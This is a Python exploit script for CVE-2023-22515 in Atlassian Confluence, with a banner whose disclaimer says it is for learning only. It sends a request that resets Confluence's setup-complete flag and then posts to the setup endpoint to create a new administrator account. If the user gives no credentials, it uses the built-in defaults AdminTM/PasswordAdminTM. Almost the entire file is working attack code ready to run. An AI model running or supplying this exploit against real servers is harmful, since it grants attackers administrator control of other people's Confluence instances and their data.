# -*- coding: utf-8 -*-
# @Author  : TongMystic
# @Time    : 2023/11/6 10:08
# @Function:
import sys
from urllib.parse import urljoin
import requests


def begin():
    print('''

  ______     _______     ____   ___ ____  _____      ____  ____  ____  _ ____  
 / ___\ \   / / ____|   |___ \ / _ \___ \|___ /     |___ \|___ \| ___|/ | ___| 
| |    \ \ / /|  _| _____ __) | | | |__) | |_ \ _____ __) | __) |___ \| |___ \ 
| |___  \ V / | |__|_____/ __/| |_| / __/ ___) |_____/ __/ / __/ ___) | |___) |
 \____|  \_/  |_____|   |_____|\___/_____|____/     |_____|_____|____/|_|____/ 

                            @Auth: T0ngMystic
                            @tips: Exp仅供学习使用，请勿用于其他用途    
                            @Blog: https://t0ngmystic.com             

        ''')


header = {
    "X-Atlassian-Token": "no-check",
    "User-Agent": "https://t0ngmystic.com?agent=VDBuZ215c3RpYw=="
}


def destroyAccessControl(domain):
    poc = "/server-info.action?bootstrapStatusProvider.applicationConfig.setupComplete=false"
    url = urljoin(domain, poc)
    res = requests.get(url, headers=header, allow_redirects=False)
    if res.status_code == 200:
        return True
    elif res.status_code == 302 and res.headers['Location'].startswith("/bootstrap/selectsetupstep"):
        return True
    else:
        print(f"\033[91mThis confluence don`t hava CVE-2023-22515\033[0m")
        return False


def creatAdminUser(domain, username, password):
    url = urljoin(domain, "/setup/setupadministrator.action")
    data = {
        "username": username,
        "fullName": username,
        "email": username + "@admin.com",
        "password": password,
        "confirm": password,
        "setup-next-button": "Next"
    }
    res = requests.post(url, data=data, headers=header)
    if res.status_code == 200:
        if res.text.find("Setup Successful") > 0 or res.text.find("设置成功") > 0:
            print(f"\033[92m[info]\033[0mSuccess Creat User\033[0m")
            print(f"\033[92m[info]\033[0m" + "UserName : " + username)
            print(f"\033[92m[info]\033[0m" + "Password : " + password)
        elif res.text.find("Setup is already complete") > 0:
            print(
                "\033[91m[error]\033[0m" + "This confluence don`t hava CVE-2023-22515 OR destroy Access Control failed")
        elif res.text.find("A user with this username already exists.") > 0 or res.text.find("用户名已存在") > 0 :
            print("\033[93m[wrong]\033[0m" + "User already exists : " + username)
            print("\033[93m[wrong]\033[0m" + "Please Give UserName And Password. tips: python .\CVE-2023-22515-EXP.py <domain> <username> <password>")



if __name__ == '__main__':
    begin()
    if len(sys.argv) == 2:
        domain = sys.argv[1]
        userName = "AdminTM".lower()
        password = "PasswordAdminTM"
        if destroyAccessControl(domain):
            creatAdminUser(domain, userName, password)
    elif len(sys.argv) == 4:
        domain = sys.argv[1]
        userName = sys.argv[2].lower()
        password = sys.argv[3]
        if destroyAccessControl(domain):
            creatAdminUser(domain, userName, password)
    else:
        print("""Help:
                 python .\CVE-2023-22515-EXP.py <Confluence_domain>
                 python .\CVE-2023-22515-EXP.py <Confluence_domain> <username> <password>""")
        sys.exit()
